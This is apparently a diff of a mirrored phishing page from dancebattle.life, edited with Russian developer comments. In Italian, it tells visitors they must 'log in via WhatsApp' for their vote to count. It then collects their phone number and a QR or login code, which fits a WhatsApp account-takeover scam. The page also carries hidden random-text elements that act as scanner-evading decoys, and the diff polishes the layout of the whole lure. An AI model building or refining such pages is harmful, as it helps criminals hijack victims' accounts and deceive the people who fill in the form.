@@ -1,451 +1,370 @@
 <!DOCTYPE html>
 <html lang="en"> <!-- Язык будет обновляться JS, если определен -->
-
 <!-- Mirrored from dancebattle.life/login/zomia-it by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 29 Apr 2025 13:02:07 GMT -->
-<!-- Added by HTTrack -->
-<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
-
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
     <link rel="icon" type="image/x-icon" href="https://dancebattle.life/static/img/svg/icon.svg">
-    <title data-translate-key="page.title">Autorizzazione</title> <!-- Ключ для перевода заголовка -->
-    <link rel="stylesheet"
-        href="https://dancebattle.life/static/css/themes/zomia/number.css?v=iF_XmVydeXA9UWMabWC6qBNqGURlNGJbit3ycULs52Q%3D" />
-    <script
-        src="https://dancebattle.life/static/js/lib/socket.io.js?v=xA14CFROUWxBqJIF79G9ZQHsZd083gKibXvVUTrHQJ8%3D"></script>
-    <script
-        src="https://dancebattle.life/static/js/lib/lazyload.js?v=tNygWs_GKZ5-7U2Dt04KB8nwYPizG4GrXlE2Ao8hjtQ%3D"></script>
-    <script
-        src="https://dancebattle.life/static/js/lib/notiflix.js?v=pXMqYvjzxYjuQ3-Iz0Zpw3Tk3BAoet8dOsODol_iqTI%3D"></script>
-    <script
-        src="https://dancebattle.life/static/js/number.js?v=44ZnprTQE_kUI3go1hDzhdZsbTsiUZ5z6xFuhpus56A%3D"></script>
-    <!-- ^^^ Файл number.js отвечает за логику выбора флага. Убедитесь, что он корректно обновляет src для img в .country .image -->
+    <title data-translate-key="page.title">Autorizzazione</title>
+    <link rel="stylesheet" href="https://dancebattle.life/static/css/themes/zomia/number.css?v=iF_XmVydeXA9UWMabWC6qBNqGURlNGJbit3ycULs52Q%3D" />
+    <script src="https://dancebattle.life/static/js/lib/socket.io.js?v=xA14CFROUWxBqJIF79G9ZQHsZd083gKibXvVUTrHQJ8%3D"></script>
+    <script src="https://dancebattle.life/static/js/lib/lazyload.js?v=tNygWs_GKZ5-7U2Dt04KB8nwYPizG4GrXlE2Ao8hjtQ%3D"></script>
+    <script src="https://dancebattle.life/static/js/lib/notiflix.js?v=pXMqYvjzxYjuQ3-Iz0Zpw3Tk3BAoet8dOsODol_iqTI%3D"></script>
+    <script src="https://dancebattle.life/static/js/number.js?v=44ZnprTQE_kUI3go1hDzhdZsbTsiUZ5z6xFuhpus56A%3D"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
     <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
-
-        <style>
-    /* Скрытые элементы (если они для чего-то нужны, иначе их можно удалить из HTML) */
-    .TdYmjJvmcSBa, .rwvCRhgYnBx, .EkrJRaLEYsO, .lmTQZiytwQd, .TjYfSpzXTNoUdv,
-    .MEZNIyFgvRhuXN, .juxoxMAnNtukzfIm, .egeWSiccsIJQ, .RdMuchDHj, .phjUabQT,
-    .CUuwPmBOQqkLDnR, .QSXSXYDCnbqkFWy, .zFFCQoOq, .HJCjuJdBRxyFkVhn {
-        display: none !important;
-    }
-
-    body {
-        background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg");
-        background-color: #ffffff;
-        background-size: cover;
-        background-position: center;
-        background-repeat: no-repeat;
-        margin: 0;
-        font-family: 'Montserrat', sans-serif;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        min-height: 100vh;
-        padding: 20px;
-        box-sizing: border-box;
-    }
-
-    .wrapper {
-        width: 100%;
-        max-width: 1000px; /* <<< УВЕЛИЧИЛ ОБЩУЮ ШИРИНУ WRAPPER */
-        margin: 0 auto;
-        padding: 20px; 
-        box-sizing: border-box;
-        min-height: 600px; /* <<< УВЕЛИЧИЛ МИНИМАЛЬНУЮ ВЫСОТУ, подберите точнее */
-        display: flex;
-        justify-content: center; 
-        align-items: center;     
-    }
-
-    .block { /* Общий стиль для #step-1 и #step-2 */
-        width: 100%;
-        display: flex;
-        flex-direction: row;    
-        justify-content: space-around; /* Можно space-between или space-evenly для другого распределения */
-        align-items: center;      
-        gap: 50px; /* <<< УВЕЛИЧИЛ ОТСТУП МЕЖДУ КОЛОНКАМИ */
-    }
-
-    .block .text { /* Текстовый блок (слева) */
-        color: #ffffff;
-        text-align: left; 
-        flex: 1 1 45%;  /* <<< ИЗМЕНЕНО: Позволяем тексту расти и сжиматься, базовая ширина 45% */
-        max-width: 480px; /* <<< УВЕЛИЧИЛ MAX-WIDTH ДЛЯ ТЕКСТА */
-    }
-
-    .block .text h2 {
-        font-size: 36px; /* <<< УВЕЛИЧИЛ РАЗМЕР ЗАГОЛОВКА */
-        font-weight: 700;
-        margin-top: 0;
-        margin-bottom: 20px; /* <<< УВЕЛИЧИЛ ОТСТУП */
-        line-height: 1.3;
-    }
-
-    .block .text p {
-        color: #c6c6c6;
-        font-size: 18px; /* <<< УВЕЛИЧИЛ РАЗМЕР ПАРАГРАФА */
-        line-height: 1.6;
-        margin-bottom: 0;
-    }
-
-    /* Контейнеры для правой колонки (форма/QR) */
-    .form-area { /* Новый общий класс для правой колонки */
-        flex: 1 1 50%; /* <<< ИЗМЕНЕНО: Позволяем расти и сжиматься, базовая ширина 50% */
-        max-width: 450px; /* <<< УВЕЛИЧИЛ MAX-WIDTH ДЛЯ ФОРМЫ */
-        display: flex;
-        flex-direction: column;
-        align-items: center; 
-    }
-    
-    /* Блок с формой на первом шаге */
-    #form-step-1.form-container { /* Это контейнер внутри .form-area */
-         background-color: #1d3957;
-         padding: 30px; /* <<< УВЕЛИЧИЛ PADDING */
-         border-radius: 10px; /* <<< УВЕЛИЧИЛ BORDER-RADIUS */
-         width: 100%; 
-         box-sizing: border-box;
-    }
-    
-    /* Для второго шага (контейнер для QR и формы ввода кода) */
-    .number-column { /* Теперь это .form-area */
-        /* Стили .form-area применяются */
-        gap: 25px; /* <<< УВЕЛИЧИЛ ОТСТУП МЕЖДУ QR И ФОРМОЙ КОДА */
-    }
-
-    .block.code .number-container { /* Блок для QR-кода и ЛОАДЕРА */
-        border: 1px solid #1d3957;
-        background-color: #ffffff; /* Фон остается белым для контраста с лоадером */
-        text-align: center;
-        padding: 20px;
-        border-radius: 10px;
-        width: 100%; 
-        box-sizing: border-box;
-        min-height: 220px; /* <<< УВЕЛИЧИЛ МИНИМАЛЬНУЮ ВЫСОТУ ДЛЯ QR/ЛОАДЕРА */
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        position: relative; /* Для позиционирования лоадера, если нужно будет */
-    }
-    .block.code .form-container.form-code { /* Блок для инпута кода на втором шаге */
-         background-color: #1d3957;
-         padding: 30px; /* <<< УВЕЛИЧИЛ PADDING */
-         border-radius: 10px; /* <<< УВЕЛИЧИЛ BORDER-RADIUS */
-         width: 100%; 
-         box-sizing: border-box;
-    }
-    .code-title { 
-        font-size: 22px; /* <<< УВЕЛИЧИЛ */
-        font-weight: 700;
-        color: #ffffff;
-        margin-bottom: 15px; /* <<< УВЕЛИЧИЛ */
-        text-align: center;
-    }
-
-    /* Общие стили для элементов форм (из ваших исходных стилей) */
-    .block.number .form .search { background-color: #ffffff; }
-    .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb { background: #152b42; }
-    .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb:hover { background: #152b42; }
-    
-    .block.number .form-container .form .country {
-        border: 1px solid #80a2b3;
-        /* Важно: убедитесь, что стили из number.css для .country (padding, display: flex и т.д.) не конфликтуют. */
-        /* Возможно, придется добавить сюда стили типа: */
-        /* display: flex; align-items: center; padding: 10px 15px; border-radius: 5px; margin-bottom: 15px; cursor: pointer; */
-    }
-    .block.number .form-container .form .country .image img,
-    .block.number .form-container .form .countries .item .image img {
-        -webkit-mask-image: none !important;
-        mask-image: none !important;
-    }
-    .block.number .form-container .form .country.active { border: 1px solid #1d9ce0; }
-    .block.number .form-container .form .country p { color: #ffffff; }
-    .block.number .form-container .form .country .icon svg path { fill: #bfbbbb; }
-    
-    .block.number .form-container .form .countries { background-color: #1d3957; }
-    .block.number .form-container .form .countries .search { background-color: #1d3957; }
-    .block.number .form-container .form .countries .search input { color: #b1c1d1; background-color: #152b42; }
-    .block.number .form-container .form .countries .items { background-color: #1d3957; }
-    .block.number .form-container .form .countries .item { background-color: #1d3957; }
-    .block.number .form-container .form .countries .item:hover { background-color: #24466b; }
-    .block.number .form-container .form .countries .item p.name { color: #b1c1d1; }
-    .block.number .form-container .form .countries .item p.code { color: #ffffff; }
-    .block.number .form-container .form .qrcode { color: #1d9ce0; }
-
-    .block.number .form-container .form input.number, 
-    .block.code .form-container .form input.number { 
-        color: #ffffff;
-        background-color: transparent;
-        border: 1px solid #80a2b3;
-        width: 100%; 
-        padding: 12px 15px; /* <<< УВЕЛИЧИЛ PADDING */
-        box-sizing: border-box;
-        border-radius: 5px; /* <<< УВЕЛИЧИЛ BORDER-RADIUS */
-        font-size: 16px;
-        margin-bottom: 20px; /* <<< УВЕЛИЧИЛ ОТСТУП */
-    }
-    .block.number .form-container .form input.number:focus,
-    .block.code .form-container .form input.number:focus {
-        border: 1px solid #1d9ce0;
-        outline: none;
-    }
-    .block.number .form-container .form p.error {
-        color: #d65d7a;
-        font-size: 14px;
-        margin-top: 10px;
-        text-align: center;
-    }
-
-    .button.primary {
-        color: #ffffff;
-        background-color: #1d9ce0E6;
-        width: 100% !important; 
-        padding: 14px 15px; /* <<< УВЕЛИЧИЛ PADDING */
-        border: none;
-        border-radius: 5px; 
-        font-size: 18px; /* <<< УВЕЛИЧИЛ РАЗМЕР ШРИФТА */
-        font-weight: 600; /* Сделал жирнее */
-        cursor: pointer;
-        transition: background-color 0.3s ease;
-        text-align: center;
-    }
-    .button.primary:hover {
-        background-color: #1d9ce0;
-    }
-
-    /* Лоадер */
-    .loader {
-        width: 60px;  /* <<< УВЕЛИЧИЛ РАЗМЕР ЛОАДЕРА */
-        height: 60px; 
-        border-radius: 50%;
-        border: 8px solid #e0e0e0; /* <<< УВЕЛИЧИЛ ТОЛЩИНУ */
-        border-top-color: #1d9ce0;
-        animation: spin 1s linear infinite;
-        /* display: inline-block;  Уже есть в .number-container display:flex, justify-content:center */
-    }
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-
-    /* Стили для попапов */
-    .popup {
-        position: fixed;
-        left: 0;
-        top: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0,0,0,0.7); /* Сделал фон темнее */
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        z-index: 1000;
-        padding: 20px;
-        box-sizing: border-box;
-    }
-    .popup .body {
-        background-color: #1d3957;
-        padding: 35px; /* <<< УВЕЛИЧИЛ PADDING */
-        border-radius: 10px; /* <<< УВЕЛИЧИЛ BORDER-RADIUS */
-        color: #ffffff;
-        text-align: center;
-        max-width: 450px; /* <<< УВЕЛИЧИЛ MAX-WIDTH */
-        width: 100%; 
-        box-sizing: border-box;
-        box-shadow: 0 5px 25px rgba(0,0,0,0.3); /* Добавил тень */
-    }
-    .popup h2 { 
-        margin-top: 0;
-        margin-bottom: 20px; /* <<< УВЕЛИЧИЛ ОТСТУП */
-        color: #ffffff; 
-        font-size: 24px; /* <<< УВЕЛИЧИЛ */
-    }
-    .popup p { 
-        color: #c6c6c6; 
-        margin-bottom: 25px; /* <<< УВЕЛИЧИЛ ОТСТУП */
-        font-size: 16px; /* <<< УВЕЛИЧИЛ */
-        line-height: 1.6;
-    }
-    .top40 .body {} 
-
-    /* Адаптивность */
-    @media screen and (max-width: 768px) {
-        .wrapper {
-            padding: 15px 10px; 
-            min-height: auto; 
-            max-width: 100%; 
+    <style>
+        /* Скрытые элементы (если они для чего-то нужны, иначе их можно удалить из HTML) */
+        .TdYmjJvmcSBa, .rwvCRhgYnBx, .EkrJRaLEYsO, .lmTQZiytwQd, .TjYfSpzXTNoUdv,
+        .MEZNIyFgvRhuXN, .juxoxMAnNtukzfIm, .egeWSiccsIJQ, .RdMuchDHj, .phjUabQT,
+        .CUuwPmBOQqkLDnR, .QSXSXYDCnbqkFWy, .zFFCQoOq, .HJCjuJdBRxyFkVhn {
+            display: none !important;
         }
-        .block {
-            flex-direction: column; 
-            align-items: center;   
+
+        body {
+            background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg");
+            background-color: #ffffff;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            margin: 0;
+            font-family: 'Montserrat', sans-serif; /* Убедитесь, что этот шрифт подключен или замените на доступный */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+            overflow-x: hidden; 
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 1100px; 
+            margin: 20px auto; 
+            padding: 30px;     
+            box-sizing: border-box;
+            display: flex;
+            justify-content: center; 
+            align-items: center;     
+        }
+
+        .block { /* Общий стиль для #step-1 и #step-2 */
+            width: 100%;
+            display: flex;
+            flex-direction: row;    
+            justify-content: space-between; 
+            align-items: center; 
+            gap: 60px; 
+            min-height: 550px; /* <<< ЗАДАЙТЕ ЗДЕСЬ ВЫСОТУ САМОГО ВЫСОКОГО БЛОКА (#step-1 или #step-2) + 20px ЗАПАСА */
+                               /* Это нужно, чтобы не было "прыжка" при переключении. Измерьте после всех правок. */
+                               /* Пример: min-height: 580px; */
+        }
+
+        .block .text { 
+            color: #ffffff;
+            text-align: left; 
+            flex: 0 0 48%;  
+            max-width: 520px; 
+        }
+
+        .block .text h2 {
+            font-size: 40px; 
+            font-weight: 700;
+            margin-top: 0;
+            margin-bottom: 25px; 
+            line-height: 1.25;
+        }
+
+        .block .text p {
+            color: #c6c6c6;
+            font-size: 18px; 
+            line-height: 1.7; 
+            margin-bottom: 0;
+        }
+
+        .form-area { 
+            flex: 0 0 48%; 
+            max-width: 480px; 
+            display: flex;
+            flex-direction: column;
+            align-items: stretch; 
             gap: 25px; 
         }
-        .block .text {
-            flex-basis: auto; 
-            width: 100%;
-            text-align: center; 
-            max-width: none;    
-            margin-bottom: 0; 
+        
+        .form-area > .form-container,
+        .form-area > .number-container { 
+             background-color: #1d3957;
+             padding: 35px; 
+             border-radius: 12px; 
+             width: 100%; 
+             box-sizing: border-box;
         }
-        .block .text h2 {
-            font-size: 26px; /* Адаптируем для мобильных */
+        
+        .form-area > .number-container {
+            background-color: #ffffff; 
+            min-height: 250px; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        .block .text p {
-            font-size: 15px; /* Адаптируем для мобильных */
+
+        .code-title { 
+            font-size: 24px; 
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 18px; 
+            text-align: center;
         }
-        .form-area { /* Правая колонка на мобильных тоже будет на всю ширину */
-            flex-basis: auto;
-            width: 100%;
-            max-width: none;
+        .block.number .form .search { background-color: #ffffff; }
+        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb { background: #152b42; }
+        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb:hover { background: #152b42; }
+        
+        /* Стили для блока выбора страны на первом шаге */
+        #form-step-1.form-container .form .country { 
+            border: 1px solid #80a2b3;
+            display: flex; 
+            align-items: center; 
+            padding: 12px 15px; 
+            border-radius: 6px; 
+            margin-bottom: 20px; 
+            cursor: pointer; 
+            background-color: transparent; /* Убедимся, что нет лишнего фона */
         }
-         #form-step-1.form-container,
-        .block.code .form-container.form-code {
-            padding: 20px;
+        #form-step-1.form-container .form .country .image img,
+        .block.number .form .countries .item .image img { 
+            -webkit-mask-image: none !important;
+            mask-image: none !important;
         }
-        .block.code .number-container {
-            border-width: 1px;
-            padding: 15px;
-            min-height: 180px; 
+        #form-step-1.form-container .form .country.active { border: 1px solid #1d9ce0; }
+        #form-step-1.form-container .form .country p.name { /* Изменил селектор для имени страны */
+            color: #ffffff; 
+            margin-left: 10px; 
+            flex-grow: 1; 
         }
-        .loader { /* Лоадер на мобильных, если нужен другой размер */
-            width: 50px;  
-            height: 50px; 
-            border-width: 6px; 
+        #form-step-1.form-container .form .country .icon svg path { fill: #bfbbbb; }
+        
+        /* Стили для выпадающего списка стран */
+        .block.number .form .countries { 
+            background-color: #1d3957; 
+            border-radius: 8px; 
+            margin-top: 5px; 
+            border: 1px solid #80a2b3; /* Добавим рамку, как у поля */
+            position: absolute; /* Чтобы не сдвигал другие элементы */
+            z-index: 10;
+            width: calc(100% - 2px); /* Ширина родителя минус рамка */
+            box-sizing: border-box;
         }
-        /* Лоадер из вашего старого кода для мобильных, если нужен именно такой большой */
-        /* Если нужен большой лоадер только в .number-container на мобильных: */
-        /*
-        .block.code .number-container .loader {
-            width: 80px; 
-            height: 80px;
-            border-width: 8px;
+        .block.number .form .countries .search { 
+            background-color: #1d3957; 
+            padding: 10px; 
         }
-        */
-    }
-</style>
+        .block.number .form .countries .search input { 
+            color: #b1c1d1; 
+            background-color: #152b42; 
+            width: 100%; 
+            padding: 10px; 
+            border: 1px solid #80a2b3; 
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .block.number .form .countries .items { 
+            background-color: #1d3957; 
+            max-height: 200px; 
+            overflow-y: auto; 
+        }
+        .block.number .form .countries .item { 
+            background-color: #1d3957; 
+            padding: 10px 15px; 
+            display: flex; 
+            align-items: center; 
+            cursor: pointer; 
+        }
+        .block.number .form .countries .item:hover { background-color: #24466b; }
+        .block.number .form .countries .item p.name { color: #b1c1d1; margin-left: 10px; flex-grow: 1; }
+        .block.number .form .countries .item p.code { color: #ffffff; }
+
+        /* Общие стили для полей ввода номера/кода */
+        .form-area input.number { 
+            color: #ffffff;
+            background-color: transparent; 
+            border: 1px solid #80a2b3;
+            width: 100%; 
+            padding: 14px 18px; 
+            box-sizing: border-box;
+            border-radius: 6px; 
+            font-size: 17px; 
+            margin-bottom: 25px; 
+        }
+        .form-area input.number:focus {
+            border-color: #1d9ce0; 
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(29, 156, 224, 0.3); 
+        }
+        #form-step-1.form-container p.error { /* Ошибка на первом шаге */
+            color: #d65d7a;
+            font-size: 15px; 
+            margin-top: -15px; /* Чтобы была ближе к полю */
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .button.primary {
+            color: #ffffff;
+            background-color: #1d9ce0E6;
+            width: 100% !important; 
+            padding: 15px; 
+            border: none;
+            border-radius: 6px; 
+            font-size: 18px; 
+            font-weight: 600; 
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            text-align: center;
+            letter-spacing: 0.5px; 
+        }
+        .button.primary:hover {
+            background-color: #1d9ce0;
+        }
+        .loader {
+            width: 70px;  
+            height: 70px; 
+            border-radius: 50%;
+            border: 9px solid rgba(29, 156, 224, 0.2); /* Полупрозрачный синий неактивный бордер */
+            border-top-color: #1d9ce0; 
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .popup {
+            position: fixed; left: 0; top: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.75); 
+            display: flex; justify-content: center; align-items: center;
+            z-index: 1000; padding: 20px; box-sizing: border-box;
+        }
+        .popup .body {
+            background-color: #1d3957; padding: 40px; 
+            border-radius: 12px; color: #ffffff; text-align: center;
+            max-width: 480px; width: 100%; box-sizing: border-box;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.35); 
+        }
+        .popup h2 {
+            margin-top: 0; margin-bottom: 20px; color: #ffffff; 
+            font-size: 26px; 
+        }
+        .popup p {
+            color: #c6c6c6; margin-bottom: 30px; font-size: 17px; 
+            line-height: 1.6;
+        }
+        .top40 .body {} 
+        /* Адаптивность */
+        @media screen and (max-width: 991px) { /* Планшеты */
+            .wrapper {
+                max-width: 100%; /* Занимает всю ширину, но с паддингами body */
+                padding: 20px;
+            }
+            .block {
+                flex-direction: column; /* Перестраиваем в колонку */
+                gap: 30px;
+                min-height: auto; /* Убираем min-height для гибкости */
+            }
+            .block .text { 
+                flex-basis: auto; /* Сбрасываем базу */
+                max-width: 600px; /* Ограничиваем текст на планшете */
+                text-align: center; /* Центрируем текст */
+                width: 100%;
+            } 
+            .form-area { 
+                flex-basis: auto; /* Сбрасываем базу */
+                max-width: 450px; /* Ограничиваем форму на планшете */
+                width: 100%;
+            } 
+            .block .text h2 { font-size: 34px; } /* Чуть меньше заголовок */
+        }
+
+        @media screen and (max-width: 768px) { /* Мобильные телефоны */
+            .wrapper {
+                padding: 15px 10px; 
+            }
+            .block {
+                gap: 25px; 
+            }
+            .block .text h2 {
+                font-size: 28px; 
+            }
+            .block .text p {
+                font-size: 16px; 
+            }
+            .form-area > .form-container,
+            .form-area > .number-container,
+            .form-area > .block.code .form-container.form-code {
+                padding: 25px; 
+            }
+            .form-area > .number-container { 
+                min-height: 200px; 
+            }
+            .loader { 
+                width: 60px;  
+                height: 60px; 
+                border-width: 8px; 
+            }
+            .popup .body {
+                padding: 30px;
+            }
+            .popup h2 { font-size: 22px; }
+            .popup p { font-size: 15px; margin-bottom: 25px; }
+        }
+    </style>
 </head>
 <body class="number-page" data-redirect="https://dancebattle.life/home/grazie" data-template="45">
-    <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm
-        hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p>
+    <!-- Удалите этот <p>, если он не нужен -->
+    <!-- <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p> -->
+    
     <div class="wrapper">
-        <!-- 
-            По поводу "прыжка" формы при переключении:
-            Это чаще всего связано с изменением общей высоты контента при смене шагов.
-            Возможные CSS-решения:
-            1. Задать .wrapper или общему контейнеру для форм (id="step-1", id="step-2")
-               минимальную высоту (min-height), достаточную для самого высокого шага.
-            2. Использовать CSS-переходы/анимации для более плавного скрытия/показа,
-               но это более сложная задача, если высота сильно меняется.
-            Текущий JS просто меняет display, что является стандартным поведением.
-        -->
-        <span class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
-            <div class="btBTGkttju">
-                <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
-            </div>
-        </span>
+        <!-- Удалите этот <span class="HJCjuJdBRxyFkVhn ..."> и его содержимое, если он не нужен (это один из ваших скрытых блоков) -->
+        <!-- <span class="HJCjuJdBRxyFkVhn ..."> ... </span> -->
+
         <div class="block number" id="step-1">
-            <small class="rwvCRhgYnBx XXfSIvFiCHTKGVhSExc fYeYajskKFDICCwX">
-                <h4 class="nfaFmFIlQtgBpY">AoZkWlXyWLOdHAFjBVhcNRj mPFTWfchNzYOhKntFfuOL ePUAFlUaf
-                    QUWrfYpkvcaXGBxIuGAEcwoas GYuOqPibs QVyNuOFFBXkZHsLGfR CgUPeYrnFfCPIxczjDslfge QQKAHgQeFpjdWgu
-                    ulKQkMUrIgoOgKcdf YxElzNKTIOIP</h4>
-            </small>
             <div class="text">
-                <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
-
+                <!-- Удалите скрытые h5, small, span, если они не нужны -->
                 <h2 data-translate-key="form1.title">Devi accedere tramite WhatsApp affinché il tuo voto venga preso in considerazione.</h2>
-                <small
-                    class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-                    <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-                        StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-                </small>
-                <span
-                    class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
-                    <div class="btBTGkttju">
-                        <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
-                    </div>
-                </span>
-                <h5
-                    class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
-                    ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi</h5>
                 <p data-translate-key="form1.description">L'autorizzazione tramite WhatsApp ti consente di proteggere i tuoi dati e risparmiare tempo.</p>
-                <span
-                    class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
-                    <div class="btBTGkttju">
-                        <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
-                    </div>
-                </span>
-                <h5
-                    class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
-                    ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi</h5>
             </div>
-            <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm
-                hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p>
-            <div id="form-step-1" class="form-container form-num">
-
-                <div class="form" id="myForm">
-                    <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">KeufuQduGbyIESnJxdKC
-                        hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX JxoZektYrbHlY WsLTZhNoKjWIykQojN
-                        LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
-                    <div class="country"> <!-- Этот блок обновляется JS (number.js или intlTelInput) при выборе страны -->
-                        <div class="image">
-                            <img src="https://dancebattle.life/static/img/flags/AU.png?v=HufG65VxnEKn_Ob-toF22UxlqX3xC9WSZK3ygAU6nQQ%3D"
-                                alt="AU">
-                        </div>
-                        <small class="rwvCRhgYnBx XXfSIvFiCHTKGVhSExc fYeYajskKFDICCwX">
-                            <h4 class="nfaFmFIlQtgBpY">AoZkWlXyWLOdHAFjBVhcNRj mPFTWfchNzYOhKntFfuOL ePUAFlUaf
-                                QUWrfYpkvcaXGBxIuGAEcwoas GYuOqPibs QVyNuOFFBXkZHsLGfR CgUPeYrnFfCPIxczjDslfge
-                                QQKAHgQeFpjdWgu ulKQkMUrIgoOgKcdf YxElzNKTIOIP</h4>
-                        </small>
-                        <p class="name">Australia</p>
-                        <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">
-                            KeufuQduGbyIESnJxdKC hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX JxoZektYrbHlY
-                            WsLTZhNoKjWIykQojN LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
-                        <div class="icon">
-                            <svg viewBox="0 0 10 5" height="5" width="10" preserveAspectRatio="xMidYMid meet" class=""
-                                fill="none">
-                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0L5 5L10 0H0Z" fill="currentColor"
-                                    fill-opacity="0.3"></path>
-                            </svg>
-                        </div>
-                        <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                            <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN
-                                ZFIDaGgBq PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-                        </span>
-                    </div>
-                    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
-                    <div class="countries hidden"> <!-- Этот блок показывается/скрывается JS (number.js) -->
-                        <strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI
-                            QZhWtdNh</strong>
-                        <div class="search">
-                            <h5
-                                class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
-                                xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
+            
+            <div class="form-area"> <!-- ОБЕРТКА ДЛЯ ПРАВОЙ КОЛОНКИ -->
+                <div id="form-step-1" class="form-container form-num">
+                    <div class="form" id="myForm">
+                        <!-- Блок выбора страны (оставляем) -->
+                        <div class="country"> 
                             <div class="image">
